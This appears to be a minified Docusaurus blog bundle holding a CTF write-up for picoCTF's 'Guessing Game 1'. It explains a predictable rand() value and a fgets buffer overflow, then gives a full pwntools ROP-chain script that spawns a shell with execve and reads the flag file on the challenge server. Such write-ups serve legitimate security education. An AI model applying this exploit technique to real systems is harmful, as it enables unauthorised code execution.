"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[142],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var s=a.createContext({}),p=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(s.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},g=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),g=p(t),h=r,m=g["".concat(s,".").concat(h)]||g[h]||u[h]||o;return t?a.createElement(m,i(i({ref:n},c),{},{components:t})):a.createElement(m,i({ref:n},c))}));function h(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,i=new Array(o);i[0]=g;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=t[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}g.displayName="MDXCreateElement"},4692:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var a=t(7462),r=(t(7294),t(3905));const o={slug:"guessing_game_1",title:"Guessing Game 1",authors:["nguyen"],tags:["Binary Exploitation"]},i=void 0,l={permalink:"/blog/guessing_game_1",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-24-guessing-game-1.md",source:"@site/blog/2022-05-24-guessing-game-1.md",title:"Guessing Game 1",description:"Description:",date:"2022-05-24T00:00:00.000Z",formattedDate:"May 24, 2022",tags:[{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:2.095,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"guessing_game_1",title:"Guessing Game 1",authors:["nguyen"],tags:["Binary Exploitation"]},prevItem:{title:"Here's a LIBC",permalink:"/blog/heres_a_libc"},nextItem:{title:"Function Overwrite",permalink:"/blog/function_overwrite"}},s={authorsImageUrls:[void 0]},p=[{value:"The Challenge",id:"the-challenge",level:2},{value:"The Solve",id:"the-solve",level:2},{value:"Script",id:"script",level:2}],c={toc:p};function u(e){let{components:n,...t}=e;return(0,r.kt)("wrapper",(0,a.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("p",null,"Description:"),(0,r.kt)("p",null,"I made a simple game to show off my programming skills. See if you can beat it!"),(0,r.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,r.kt)("p",null,"Challenge can be found ",(0,r.kt)("a",{parentName:"p",href:"https://play.picoctf.org/practice/challenge/90?page=1&search=guess"},"here")),(0,r.kt)("h2",{id:"the-solve"},"The Solve"),(0,r.kt)("p",null,"Upon inspection of the source code, I saw that there is no call to ",(0,r.kt)("inlineCode",{parentName:"p"},"srand()")," meaning that the value for ",(0,r.kt)("inlineCode",{parentName:"p"},"rand()")," stays the same every time the program is run. We can extract the value using gdb and get ",(0,r.kt)("inlineCode",{parentName:"p"},"0x53"),". Incrementing this by 1 gives us the correct value ",(0,r.kt)("inlineCode",{parentName:"p"},"84"),". Entering this value to the program allows us to reach the ",(0,r.kt)("inlineCode",{parentName:"p"},"win")," function."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"win")," contains a buffer overflow when it calls ",(0,r.kt)("inlineCode",{parentName:"p"},"fgets"),". I could not find the challenge flag within the executable so I used ropper to find ROP gadgets and obtain a shell."),(0,r.kt)("p",null,"Conditions for obtaining a shell with execve:"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"char ","*"," filepath set to /bin/sh in rdi"),(0,r.kt)("li",{parentName:"ol"},"char ","*"," argv set to NULL in rsi"),(0,r.kt)("li",{parentName:"ol"},"char ","*"," envp set to NULL in rdx"),(0,r.kt)("li",{parentName:"ol"},"value 0x3b for syscall in rax")),(0,r.kt)("p",null,"After obtaining a shell, I was able to see that there was a flag file and ",(0,r.kt)("inlineCode",{parentName:"p"},"cat")," it."),(0,r.kt)("h2",{id:"script"},"Script"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"\"\"\"\nToast's submission for picoGym challenge Guessing Game 1.\n\nThis script can be used in the following manner:\npython3 ./solve.py <REMOTE/LOCAL>\n\nArgs:\n    param1: LOCAL will operate locally on the user's machine.\n            REMOTE will connect to the CTF webserver and grab the flag.\n            If no parameter is specified, the program will default to LOCAL.\n\nReturns:\n    The flag to solve the challenge.\n\"\"\"\n\nfrom pwn import *\n\nexe = ELF(\"./vuln\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\ndef conn():\n    '''Establish the connection to the process, local or remote.\n    '''\n\n    if args.get('REMOTE'):\n        io = remote('jupiter.challenges.picoctf.org', 50581)\n    elif args.get('GDB'):\n        io = gdb.debug([exe.path])\n    else:\n        io = process([exe.path])\n\n    return io\n\n\ndef main():\n    flag = get_flag()\n    log.success(flag)\n\n\ndef get_flag():\n    '''Return the flag.\n    '''\n    with conn() as io:\n        io.sendline(b\"84\")\n        payload = b\"A\" * 120\n\n        # 0x6ba0e0 Address of Data section\n        # 0x400696 pop rdi; ret;\n        payload += p64(0x400696) + p64(0x6ba0e0)\n\n        # 0x410ca3 pop rsi; ret;\n        payload += p64(0x410ca3) + b\"/bin//sh\"\n\n        # 0x447d7b mov qword ptr [rdi], rsi; ret;\n        payload += p64(0x447d7b)\n\n        # 0x6ba0e8 address of DATA + 8\n        # 0x410ca3 pop rsi; ret;\n        payload += p64(0x410ca3) + p64(0x6ba0e8)\n\n        # 0x6ba0e8 address of DATA + 8\n        # 0x44cc26 pop rdx; ret;\n        payload += p64(0x44cc26) + p64(0x6ba0e8)\n\n        # 0x4163f4 pop rax; ret;\n        payload += p64(0x4163f4) + p64(0x3b)\n\n        # 0x40137c syscall;\n        payload += p64(0x40137c)\n\n        io.sendline(payload)\n\n        io.recvuntil(b\"\\x06\")\n        io.recvuntil(b\"@\\n\\n\")\n        io.sendline(b\"cat flag.txt\")\n        flag = io.recvline()\n        io.close()\n        return flag.decode()\n\n\nif __name__ == '__main__':\n    main()\n")))}u.isMDXComponent=!0}}]);